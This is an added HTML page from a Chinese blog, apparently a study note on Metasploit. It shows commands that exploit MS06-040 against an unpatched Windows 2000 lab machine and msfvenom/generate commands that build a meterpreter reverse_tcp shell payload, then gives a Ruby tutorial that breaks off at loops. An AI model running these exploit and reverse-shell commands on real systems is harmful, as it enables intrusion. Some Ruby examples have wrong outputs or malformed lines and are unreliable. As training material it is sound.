@@ -1,0 +1,556 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>MSF 安全开发 | 南行</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
+  font-family: Bender;
+  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+  font-family: BenderLight;
+  src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+  font-family: 'JetBrains Mono';
+  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+ --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+ --light-background: url('/img/bk.jpg');
+ --theme-encrypt-confirm: 'confirm'
+}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
+window.mermaid = mermaid;
+code.paintMermaid();
+</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>MSF 安全开发</h1></div><hr><div id="post-content"><h2 id="MSF-简介"><a href="#MSF-简介" class="headerlink" title="MSF 简介"></a>MSF 简介</h2><p>在软件工业中，面向对象、封装等概念的提出对漏洞利用、漏洞测试等领域产生了深远的影响。就像软件开发中的 MFC 架构、.NET 架构一样，安全技术领域也有自己的框架，用于协助漏洞利用（Exploit）的迅速开发。MetaSploit Framework 就是其中最著名的一个。</p>
+<p>类似于现代军工中导弹的模块化生产和组装，MetaSploit Framework 将漏洞利用的过程进行了封装和模块化，使得漏洞攻击测试变得像发射导弹一样简单，只需选择合适的模块并进行组合。</p>
+<p>2003年7月，H.D. Moore 使用 Perl 语言实现了 MetaSploit 1.0，这是一个将漏洞测试各环节模块化、标准化的框架，帮助攻击者和安全研究员进行渗透测试。MSF是开源和免费的，支持修改和扩展，受到广大安全研究者的支持，许多漏洞 POC 代码也以 MSF 模块为标准发布。</p>
+<p>MetaSploit Framework包含以下模块：</p>
+<ul>
+<li>exploit：攻击脚本，执行漏洞攻击。</li>
+<li>auxiliary：附加插件，如网络欺骗、DOS、Sniffer工具等。</li>
+<li>payload：各种操作系统各种用途的 shellcode</li>
+<li>encoder：编码算法</li>
+<li>nop：填充数据（<code>\x90</code>），用于保证 shellcode 的正常执行。</li>
+</ul>
+<p>使用 MSF 进行安全测试的过程，实际上就是选择并组合这些模块，构成一个完整的攻击工具链。因此，即使不懂二进制或汇编的人，也能轻松发起攻击。</p>
+<p>MSF 如何安装这里就不叙述了，可以查看官方文档进行对应系统安装。</p>
+<h2 id="MSF-基本使用"><a href="#MSF-基本使用" class="headerlink" title="MSF 基本使用"></a>MSF 基本使用</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>这里将通过一个真实的漏洞利用案例演示 MetaSploit 的基本使用方法。</p>
+<p>所选用漏洞的微软编号为 MS06-040，CVE 编号为 CVE-2006-3439，这个漏洞对应的安全补丁为 KB921883。 Windows 系统的动态链接库文件<code>netapi32.dll</code>中第317个导出函数<code>NetpwPathCanon- icalize()</code>对于字符串参数的处理存在典型的栈溢出。更加不幸的是，这个函数可以通过 RPC 的方式被远程调用，因此，成功利用这个漏洞可以远程控制目标主机。</p>
+<ul>
+<li>实验环境：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击主机操作系统</td>
+<td>Ubuntu 22.04.1</td>
+<td>Windows、Linux、Max OS 等 MSF 支持的操作系统均可</td>
+</tr>
+<tr>
+<td>目标主机操作系统</td>
+<td>Windows 2000 SP0~SP4</td>
+<td>Windows XP SP1 中的漏洞也可以获得远程控制权， 目标主机操作系统 Windows 2000 SP0~SP4 但SP2上只能达到DOS的效果</td>
+</tr>
+<tr>
+<td>目标 PC</td>
+<td>虚拟机</td>
+<td>虚拟机或实体计算机均可用于攻击测试</td>
+</tr>
+<tr>
+<td>补丁版本</td>
+<td>未打过 KB921883 补丁</td>
+<td>务必确保实验所用的目标主机中的漏洞未被Patch</td>
+</tr>
+<tr>
+<td>MSF 版本</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>网络环境</td>
+<td>攻击主机与目标主机互相可达</td>
+<td>确保防火墙等不会影响TCP链接的正常建立</td>
+</tr>
+</tbody></table>
+<h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>MSF 提供了三种不同的用户界面，分别是 GUI 界面、普通命令行界面（Console） 和 Ruby 命令界面（Ruby shell）。其中，GUI 界面通过浏览器进入，命令行界面在安装并配置 MSF 环境变量后可以通过<code>msfconsole</code>命令进入，Ruby<br>命令界面可以在 MSF 或命令行中输入<code>irb</code>命令进入。</p>
+<p>我们一般使用命令行界面来进行漏洞测试，因为这样会比较快捷。</p>
+<p>漏洞测试流程：</p>
+<ul>
+<li><code>msfconsole</code> 启动命令行界面</li>
+<li><code>search MS06-040</code> 搜索exploit</li>
+<li><code>use windows/smb/ms06_040_netapi</code> 选择 MS06-040 漏洞进行攻击测试。</li>
+<li><code>info</code> 显示当前选中漏洞的详细描述和信息。</li>
+<li><code>show targets</code> 显示当前漏洞能够攻击的目标操作系统版本。</li>
+<li><code>set target 0</code> 选择 Windows 2000</li>
+<li><code>show payloads</code> 列出所有可用的 shellcode，即在当前漏洞下可用的攻击载荷。</li>
+<li><code>set payload windows/adduser</code> 选择 <code>adduser</code> 为 shellcode，这将创建一个新的用户。</li>
+<li><code>show options</code> 显示当前所选漏洞和 shellcode 所需配置的选项，有些参数默认已经为我们配置好了。</li>
+<li><code>set RHOST 192.168.74.62</code> 根据 <code>show options</code> 提示设置目标主机的 IP 地址。</li>
+<li><code>exploit</code>：启动攻击测试，MSF 会利用选择的漏洞和攻击载荷进行攻击。</li>
+</ul>
+<p>我们可以在 Windows 2000 的 cmd 中使用<code>net user</code>查看是否创建了用户。</p>
+<p>可以看到成功创建了默认的<code>metasploit</code>用户。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020241209080602.png'><img src="/assets/Pasted%20image%2020241209080602.png"></p>
+<h2 id="利用-MSF-制作-shellcode"><a href="#利用-MSF-制作-shellcode" class="headerlink" title="利用 MSF 制作 shellcode"></a>利用 MSF 制作 shellcode</h2><p>MSF 除了可以进行攻击测试之外，它所包含的众多 Payload 模块还可以导出以各种编程语言表示的 shellcode。 </p>
+<h3 id="选择-Payload-模块"><a href="#选择-Payload-模块" class="headerlink" title="选择 Payload 模块"></a>选择 Payload 模块</h3><p>首先，需要选择你要使用的 payload 模块。可以通过 <code>use</code> 命令来选择一个 payload。</p>
+<p>例如，如果你想使用 <code>windows/meterpreter/reverse_tcp</code> 作为 payload，可以通过以下命令进行选择：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use payload/windows/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure>
+
+<h3 id="设置-Payload-参数"><a href="#设置-Payload-参数" class="headerlink" title="设置 Payload 参数"></a>设置 Payload 参数</h3><ul>
+<li>查看 payload 需要设置的参数：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">show options<br></code></pre></td></tr></table></figure>
+
+<p>这里的<code>windows/meterpreter/reverse_tcp</code>需要设置的参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msf6 payload(windows/meterpreter/reverse_tcp) &gt; show options<br><br>Module options (payload/windows/meterpreter/reverse_tcp):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)<br>   LHOST                      yes       The listen address (an interface may be specified)<br>   LPORT     4444             yes       The listen port<br><br><br>View the full module info with the info, or info -d command.<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>设置参数</li>
+</ul>
+<p>根据参数信息设置参数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">set LHOST 192.168.1.10<br>set LPORT 4444<br>set EXITFUNC seh<br></code></pre></td></tr></table></figure>
+
+<h3 id="导出-Shellcode"><a href="#导出-Shellcode" class="headerlink" title="导出 Shellcode"></a>导出 Shellcode</h3><p>要导出 payload 的 shellcode，可以使用 <code>generate</code> 命令。<code>generate</code> 命令可以生成 payload 的 shellcode 并将其导出为文件或显示在终端中。</p>
+<ul>
+<li>输出到标准输出：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">generate -f raw<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>输出到目标文件</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">generate -f raw -o /root/shellcode.bin<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-f raw</code> 表示输出为原始 shellcode 格式（无任何封装）。</li>
+<li><code>-o</code> 后跟导出文件路径，可以将 shellcode 保存为二进制文件。</li>
+</ul>
+<p>生成的 shellcode 通常会显示为一串二进制字节流，可以将其保存到文件中，或者通过脚本在目标系统中执行。</p>
+<p>其他常见输出格式：</p>
+<ul>
+<li><code>raw</code>：原始 shellcode（最常见格式）。</li>
+<li><code>c</code>：C语言风格的数组。</li>
+<li><code>python</code>：Python 字符串格式的 shellcode。</li>
+<li><code>perl</code>：Perl 格式。</li>
+<li><code>exe</code>：直接生成可执行文件。</li>
+<li><code>msf</code>：Metasploit 自有的二进制格式，适用于进一步的处理。</li>
+</ul>
+<h3 id="使用-msfvenom-导出-Shellcode"><a href="#使用-msfvenom-导出-Shellcode" class="headerlink" title="使用 msfvenom 导出 Shellcode"></a>使用 msfvenom 导出 Shellcode</h3><p>我们可以不启动 MSF 使用 <code>msfvenom</code>（Metasploit 的 Payload 生成工具）导出 shellcode：</p>
+<p>这样我们需要直接在命令中配置 payload 的相关参数。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c &gt; shellcode.c<br></code></pre></td></tr></table></figure>
+
+<p>这将生成 C 风格的 shellcode，并将其保存到 <code>shellcode.c</code> 文件中。</p>
+<h2 id="用-MSF-扫描跳板"><a href="#用-MSF-扫描跳板" class="headerlink" title="用 MSF 扫描跳板"></a>用 MSF 扫描跳板</h2><p>MSF 提供了许多附带的小工具，如 netcat 等，方便安全研究人员进行攻击测试。</p>
+<p>这里介绍一个编写 exp 经常用到的插件 msfpescan。</p>
+<p>我们在编写 exp 的时候通常需要在可执行文件或库中搜索可用的 gadget。</p>
+<p>msfpescan 就是这样一款在 PE 文件中扫描跳转指令并直接转化为 VA 的工具，它使用起来更加简单灵活。</p>
+<ul>
+<li>用法：</li>
+</ul>
+<p class='item-img' data-src='/assets/Pasted%20image%2020241208161223.png'><img src="/assets/Pasted%20image%2020241208161223.png"></p>
+<ul>
+<li>案例：</li>
+</ul>
+<p>我们想要搜索<code>ch72.exe</code>中所有类似<code>jmp edi</code>的指令，可以这样做：</p>
+<ol>
+<li>启动 MSF</li>
+<li>使用命令<code>msfpescan -h</code>可以查看这个工具的帮助说明。</li>
+<li>键入命令<code>msfpescan -f -j edi /root/ch72.exe</code>搜索其中的<code>jmp edi</code>指令地址，并转化为 VA 显示。</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; msfpescan -f -j edi /root/ch72.exe<br>[*] exec: msfpescan -f -j edi /root/ch72.exe<br><br><br>[/root/ch72.exe]<br>0x0040189c call edi<br>0x004018c7 call edi<br>0x0040421e call edi<br>0x00404234 call edi<br>0x00404910 call edi<br>0x004049bc call edi<br>0x0040ad54 call edi<br>0x0040b083 call edi<br>0x0040b0a9 call edi<br>0x0041193c call edi<br>0x004119e6 call edi<br>0x00411a2c call edi<br>0x00418f85 call edi<br>0x00418f8d call edi<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="Ruby-语法"><a href="#Ruby-语法" class="headerlink" title="Ruby 语法"></a>Ruby 语法</h2><p>MSF 是用 Ruby 来开发的，所以我们要对 MSF 进行模块开发的话就必须了解以下 Ruby 的语法。</p>
+<h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World!"></a>Hello World!</h3><p>以经典的<code>Hello World!</code>开始我们 Ruby 的学习。</p>
+<p>在一般文本文件中写入：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby</span><br>print <span class="hljs-string">&quot;Hello World!\n&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>保存为<code>r.rb</code>并放在 MSF 的安装目录下的 MSF 文件夹下。</p>
+<p>从 MSF 安装目录下启动 MSF 命令行窗口，在命令行窗口中键入<code>ruby t.rb</code>，得到运行结果。</p>
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Hello World!<br></code></pre></td></tr></table></figure>
+
+<p>我们也可以通过在 MSF 中输入<code>irb</code>进入 Ruby shell 来执行 Ruby 代码。</p>
+<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>Ruby 和 python一样使用<code>#</code>作为注释符</p>
+<ul>
+<li>例</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment">#这是注释</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>Ruby 中的变量非常灵活，一般除保留字外的字母组合都可作为变量名，全局变量以符号<code>$</code>开头，如<code>$a</code>。 Ruby变量为动态类型，同一个变量可以用于字符串，也可以用于整型，并且不需要提前声明。 </p>
+<ul>
+<li>例</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby </span><br>a=<span class="hljs-string">&quot;failwest\n&quot;</span> <br>print a <br>a=<span class="hljs-number">4</span> <br>print a<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">failwest<br><span class="hljs-number">4</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3><p>和大多数脚本语言类似，Ruby 有两种字符串：可转义字符串和纯字符串。 </p>
+<p>用双引号括起来的字符串为可转义字符串，这种字符串内部可以使用各种转义符，甚至可以使用变量。</p>
+<p>变量的转义符号为：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment">#&#123;变量名或表达式名&#125;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>例</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby </span><br>a=<span class="hljs-number">4</span><br>b=<span class="hljs-number">7</span><br>c=<span class="hljs-string">&quot;a+b=<span class="hljs-subst">#&#123;a+b&#125;</span>\n&quot;</span><br>print c<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a+b=11<br></code></pre></td></tr></table></figure>
+
+<p>用单引号括起来的字符串为纯字符串，除了单引号自身的转义符号<code>\&#39;</code>之外，这种字符串内部不再支持其他转义字符。</p>
+<ul>
+<li>例</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby</span><br>a=<span class="hljs-number">4</span><br>b=<span class="hljs-number">7</span><br>c=<span class="hljs-string">&#x27;a+b<span class="hljs-subst">#&#123;a+b&#125;</span>\n&#x27;</span><br>print c<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a+b=#&#123;a+b&#125;\n<br></code></pre></td></tr></table></figure>
+
+<p>如果纯字符串中经常出现单引号，为了避免反复使用<code>\&#39;</code>进行转义，可以使用另外几种纯字符串表示方法，并且这些表达方式在 MSF 模块中经常遇见，例如，下面几种表示方法是等价的。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">&#x27;fail\&#x27;west&#x27;</span><br><span class="hljs-string">%q&#123;fail&#x27;west&#125;</span><br><span class="hljs-string">%q&#123;fail&#x27;west/</span><br><span class="hljs-string">%q&#123;fail&#x27;west/</span><br><span class="hljs-string">%q&#123;fail&#x27;west/</span><br></code></pre></td></tr></table></figure>
+
+<p>字母 q 在这里代表 quote（引号）的意思。</p>
+<p>Ruby 对运算符做了很好的重载，大大方便了字符串操作。</p>
+<p>运算符<code>&lt;&lt;</code>、<code>+</code>都表示了字符串连接。</p>
+<ul>
+<li>例</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby</span><br>a=<span class="hljs-string">&quot;fail&quot;</span><br>a&lt;&lt;<span class="hljs-string">&quot;west&quot;</span><br>a=<span class="hljs-string">&quot;hello &quot;</span>+a<br>print a<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">hello ailwes<br></code></pre></td></tr></table></figure>
+
+<p>运算符<code>*</code>表示复制字符串若干遍，在开发 exploit 时可以用类似<code>\x90*100</code>的表达式方便地布置缓冲区。</p>
+<ul>
+<li>例</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby </span><br>a=<span class="hljs-string">&quot;1234&quot;</span>*<span class="hljs-number">4</span><br>print a<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-number">1234123412341234</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>Ruby 的数组元素用方括号标识，元素之间用逗号隔开。Ruby 是纯粹面向对象语言，一切语言元素皆为对象，数组也一样。Ruby 数组中的元素可以是不同类型的常量、变量，还可以任意嵌套，并且不用提前声明类型和大小。</p>
+<ul>
+<li>例</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby </span><br>a=[<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;failwest&#x27;</span>,[<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;test&#x27;</span>]] <br>print <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;a[<span class="hljs-number">0</span>]&#125;</span>\n&quot;</span> <br>print <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;a[<span class="hljs-number">1</span>]&#125;</span>\n&quot;</span> <br>print <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;a[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]&#125;</span>\n&quot;</span> <br>print <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;a[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>]&#125;</span>\n&quot;</span> <br>print a<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-number">1</span><br>failwest<br><span class="hljs-number">3</span><br>test<br>[<span class="hljs-number">1</span>, <span class="hljs-string">&quot;failwest&quot;</span>, [<span class="hljs-number">3</span>, <span class="hljs-string">&quot;test&quot;</span>]]=&gt; <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p>hash 表是 MSF 模块中大量使用的一种数据结构。hash 表的作用和数组类似，但数组使用数字作为索引来引用数据，很容易对数据的意义产生混淆。通过 hash 表中作为索引的字符串来引用数据则不存在这个问题。 hash 用大括号标识，每一对映射之间用逗号隔开。映射运算符为<code>=&gt;</code>，其中，左边是键 （key），右边是值（value）。键与值之间的数据类型可以没有任何联系，我们甚至可以把一个字符串映射为一个嵌套的数组。</p>
+<p>这个跟 php 的数组很像。</p>
+<ul>
+<li>例</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby </span><br>a = &#123; <br>	<span class="hljs-string">&#x27;zero&#x27;</span> =&gt; <span class="hljs-string">&quot;this is the value of zero\n&quot;</span>, <br>	<span class="hljs-string">&#x27;one&#x27;</span> =&gt; [<span class="hljs-string">&quot;failwest\n&quot;</span> , <span class="hljs-number">1</span>] <br>&#125; <br>print a[<span class="hljs-string">&#x27;zero&#x27;</span>] <br>print a[<span class="hljs-string">&#x27;one&#x27;</span>][<span class="hljs-number">0</span>] <br>print a[<span class="hljs-string">&#x27;one&#x27;</span>][<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">this is the value of zero<br>failwest<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h3><ul>
+<li>例</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/env ruby </span><br>age=<span class="hljs-number">18</span><br><span class="hljs-keyword">if</span> age &gt; <span class="hljs-number">18</span><br>    puts <span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-keyword">else</span><br>    puts <span class="hljs-string">&quot;2&quot;</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">2<br></code></pre></td></tr></table></figure>
+
+<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p><code>while</code>循环</p>
+<p>几乎所有的高级编程语言都有这个循环。</p>
+<ul>
+<li>例</li>
+</ul>
